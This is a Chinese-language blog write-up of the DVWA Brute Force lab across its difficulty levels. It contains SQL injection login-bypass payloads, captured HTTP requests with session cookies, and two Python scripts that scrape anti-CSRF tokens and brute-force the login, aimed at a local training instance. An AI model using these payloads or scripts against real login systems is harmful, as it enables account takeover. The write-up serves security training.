---
layout: post
title: "DVWA Brute Force"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_BruteForce
author: ""
tags: ['DVWA', 'BruteForce']
---



# DVWA Brute Force

###### tags: `DVWA`


## Low:

**分析code**

* get 傳值
* username 沒過濾
* password 沒過濾 但md5 hash了
* sql 直接拼接 所以可以sql 注入


<br/>
<br/>


因此我們可以使用 username 來注入

```php=
	$user = $_GET[ 'username' ];

	// Get password
	$pass = $_GET[ 'password' ];
	$pass = md5( $pass );

	// Check the database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";


        //自己把 query 打印一下 並且 exit()
	var_dump($query);
	exit();
```
<br/>
<br/>



先隨變輸入並且dump 語句分析:

```php=
username = 11111111111111
password = 22222222222222

string(102) "SELECT * FROM `users` WHERE user = '11111111111111' AND password = '26c924b47cf221582c9d5aede42dadf5';"
```


<br/>
<br/>


使用單引號前後閉合，密碼已經不重要了，不可控

```php=
username = admin' or '1
password =

成功
string(100) "SELECT * FROM `users` WHERE user = 'admin' or '1' AND password = 'd41d8cd98f00b204e9800998ecf8427e';"

```


<br/>
<br/>



可以理解一下為沒閉合為何報錯
```php=
username = admin' or 1 #
password =
失敗報錯:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND password = 'd41d8cd98f00b204e9800998ecf8427e'' at line 1




username = admin' or '1' = '1
password =
成功

```


<br/>
<br/>



註釋繞過
```php=
#號繞過
username = admin' #
password =

成功


-- (空格) (不加空格會失敗) 
username = admin' -- 
password =

成功


```


以上為sql 繞過方式，接下來是題目要求的brute force:

<br/>

burpsuite 抓包
```http=
GET /vulnerabilities/brute/?username=11111111111111111&password=2222222222222222222&Login=Login HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost/vulnerabilities/brute/
Cookie: wp-settings-time-1=1666091374; PHPSESSID=a9f10ad57eff3bee65f1769861e2919e; security=low
Upgrade-Insecure-Requests: 1

```


選擇runtime file 字典檔 bf.txt

```
a
b
c
d
password
```

最後會依據封包長度來判斷response的內容，通常不一樣的就是答案

密碼:password
<br/>
<br/>


## Medium

* mysqli_real_escape_string 轉譯單引號 (斜槓 + 單引號)，無法sql 注入了
* 但5.4 sql 可以用 寬字節繞過



```php=
	$user = $_GET[ 'username' ];
	$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitise password input
	$pass = $_GET[ 'password' ];
	$pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass = md5( $pass );

```



登入失敗加上2秒
```php=
    // Login failed
    sleep( 2 );
    $html .= "<pre><br />Username and/or password incorrect.</pre>";
```

還是可以用爆破只是時間比較久。
<br/>
<br/>


## High


* stripslashes 去掉 /
* mysqli_real_escape_string 單引號轉譯 / + ' 
* token 值

token 驗證:
```
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

```


失敗睡0-3秒
```
		// Login failed
		sleep( rand( 0, 3 ) );
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
```




bp:
```http=
GET /vulnerabilities/brute/?username=111111111&password=22222222222&Login=Login&user_token=659aba0ee90e738b8974e2be535454b2 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost/vulnerabilities/brute/
Cookie: wp-settings-time-1=1666091374; PHPSESSID=a9f10ad57eff3bee65f1769861e2919e; security=high
Upgrade-Insecure-Requests: 1


```



這邊思路是使用爬蟲。

寫一個爬蟲 功能是，抓取最新頁面的token，然後get請求送出

參考:https://lonelysec.com/dvwa%ef%bc%88damn-vulnerable-web-application%ef%bc%89-brute-force/

python:
```python=
import urllib2
import re

#輸入當前IP地址
IP = '192.168.43.96'
#輸入自己當前的sessionid
PHPSESSID = '61adb5af7a80da7bba6a0d22110e39a4'

#設定cookie
opener = urllib2.build_opener()
opener.addheaders.append(('Cookie', 'security=high; PHPSESSID=' + PHPSESSID))

#爆破字典
usernames = ['admin','manage','system','root','whoami']
passwords = ['admin','root','123456','password','abc123','111111','654321','000000']

#確認破解範圍
flag=0

for username in usernames:
    if flag==1:
        break
    for password in passwords:
        #訪問首頁
        response = opener.open('http://' + IP + '/vulnerabilities/brute/')
        content = response.read()
        #獲取user_token
        user_token = re.findall(r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)",content)[0]
        #傳送登入資料包
        url = 'http://'+IP+'/vulnerabilities/brute/?username='+username+'&password='+password+'&Login=Login&user_token='+user_token
        response = opener.open(url)
        content = response.read()
        #確認破解結果
        print '-'*20
        print u'使用者名稱：'+username
        print u'密碼：'+password
        if 'Username and/or password incorrect.' in content:
            print u'Fail...'
        else:
            print u'Success~'
            flag=1
            break
        print '-'*20



```

正則表達:
```
r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)"
```

```
r"" 代表""裡面的是正則式

(?<=xxx) 代表xxx開頭

. 匹配除“\n”之外的任何单个字符。要匹配包括“\n”在内的任何字符

+ 代表匹配前面的子表达式一次或多次。例如，“zo+”能匹配“zo”以及“zoo”，但不能匹配“z”

? 代表非貪婪

(?=xxx)代表以xxx結尾 
```






### 另一種BP 外掛 ，其實原理一模一樣。

CSRF Token Tracker

logger++

這邊我以前實驗過，可以成功，最新不知道是不是版本出問題，不會自動抓token

<br/><br/>


### 不然用postman + curl + python 自己拼一拼。

postman 加上 需要的 header 然後 get 請求，轉成 curl 命令

我們在加上 -s 參數 不顯示進度條
```bash=
curl -s --location --request GET 'http://192.168.43.96/vulnerabilities/brute/' --header 'Cookie: PHPSESSID=6db3502521fc376f123936246f53c91d; security=high'

```

curl 請求會拿到 html，在搜索token，在加上token 送出


```python
import os
import re


pwd_list = ['admin','123','666']





for pwd in pwd_list:

	
	host = "http://192.168.43.96/vulnerabilities/brute/"
	username = "?username=admin"
	password = "&password="
	login="&Login=Login"
	user_token="&user_token="


	# cmd execute curl and get token 
	#############################################
	
	cmd = "curl -s --location --request GET " + host + " --header 'Cookie: PHPSESSID=6db3502521fc376f123936246f53c91d; security=high' "
	cmd_result = os.popen(cmd)


	pattern = "(?<=user_token\' value=\')\w*"
	#re.findall return a list 
	regex_result = re.findall(pattern , cmd_result.read())
	
	token = ''.join(regex_result)
	#############################################

	password += pwd
	user_token += token	
	url = host + username + password + login + user_token
	
	url ="'" + url + "'"
	
	 
	
	#final request 	
	cmd2 = "curl -s --location --request GET " + url + " --header 'Cookie: PHPSESSID=6db3502521fc376f123936246f53c91d; security=high' "
	cmd2_result = os.popen(cmd2)	
	
	
	#成功登入會有以下字串
	key_word = "Welcome to the password protected area admin"
	#搜索字串
	find_result = cmd2_result.read().find(key_word)
	#有找到就顯示密碼
	if(find_result != -1):
		print("password found: "+pwd)
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	






```


















<br/>
<br/>

# impossilbe


* mysqli_real_escape_string
* stripslashes



PDO 防sql 注入
```
	$data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
	$data->bindParam( ':user', $user, PDO::PARAM_STR );
	$data->execute();
```


延時 三次失敗 鎖15分
```
	// Default values
	$total_failed_login = 3;
	$lockout_time       = 15;
	$account_locked     = false;
```





## 後記:


high 難度 我一開始想用 fetch 去抓token 最後因為CROS 同源政策檔掉了。所以只能改爬蟲思路。

<br/>
<br/>
<br/>
<br/>
